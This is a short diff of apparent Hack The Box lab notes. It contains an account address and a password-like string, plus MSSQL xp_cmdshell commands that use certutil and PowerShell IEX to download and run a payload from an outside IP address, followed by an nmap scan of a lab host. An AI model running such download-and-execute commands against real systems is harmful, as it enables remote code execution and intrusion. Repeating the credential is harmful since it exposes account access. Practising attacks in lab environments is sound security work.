@@ -3,8 +3,7 @@
 htb-ac-1444035@htb-pmuseptgcc.htb-cloud.com
 y2BDp1p8
 
-EXEC xp_cmdshell 'certutil -urlcache -split -f http://95.111.254.81/ps.exe C:\Users\Public\ps.exe';```
-# Nmap
+EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://95.111.254.81/shell.ps1'')"'# Nmap
 
 ```
 nmap -sVC --min-rate 1500 -p- -Pn 10.10.11.68
